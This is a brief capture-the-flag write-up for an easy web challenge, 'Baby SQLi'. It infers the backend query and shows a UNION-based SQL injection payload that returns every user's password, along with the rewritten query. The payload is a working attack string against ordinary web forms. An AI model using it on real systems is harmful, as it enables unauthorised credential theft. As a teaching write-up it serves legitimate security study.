# Web: Baby SQLi
Difficulty: Easy

This challenge is identical to the regular SQLi challenge, except you are given the table and column names from the start. 

In order to leak the password, we can perform a simple SQL injection attack.

https://portswigger.net/web-security/sql-injection

Using the information given from the description, we can guess that the SQL command looks something like:

```
SELECT username FROM users WHERE email = '____________'
```

If we input an email of:
```
' OR 1=1 UNION select password from users--
```

Then the SQL command looks like:
```
SELECT username FROM users WHERE email = '' OR 1=1 UNION select password from users--

```

Which matches every user and gets you the password, attached onto the original query. 
